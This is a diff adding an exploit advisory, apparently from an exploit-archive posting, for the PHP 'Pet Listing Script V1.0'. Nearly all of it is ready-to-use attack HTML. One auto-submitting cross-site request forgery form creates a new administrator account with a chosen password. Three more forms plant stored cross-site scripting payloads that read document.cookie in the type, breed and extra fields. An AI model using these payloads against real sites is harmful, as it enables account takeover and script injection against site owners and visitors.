@@ -1,0 +1,75 @@
+Pet Listing Script V1.0 - Multiple Vulnerabilities
+====================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.phpjabbers.com/pet-listing-script/
+####################################################################
+
+===[ Exploit ]===
+
+[1] Cross Site Request Forgery
+==============================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminUsers&action=create">
+<input type="hidden" name="user_create" value="1"/>
+<input type="hidden" name="role_id" value="1"/>
+<input type="hidden" name="username" value="Admin"/>
+<input type="hidden" name="password" value="Password"/>
+<input type="hidden" name="status" value="T"/>
+</form>
+</body>
+</html>
+
+[2] Multiple Cross Site Scripting
+==================================
+
+# CSRF with XSS Exploit:
+
+I. Xss In Type
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminTypes&action=create">
+<input type="hidden" name="type_create" value="1"/>
+<input type="hidden" name="type_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+
+II. Xss In Breed
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminBreeds&action=create">
+<input type="hidden" name="breed_create" value="1"/>
+<input type="hidden" name="breed_title"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="type_id" value="2"/>
+</form>
+</body>
+</html>
+
+III. Xss In Extra
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminExtras&action=create">
+<input type="hidden" name="extra_create" value="1"/>
+<input type="hidden" name="extra_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+####################################################################
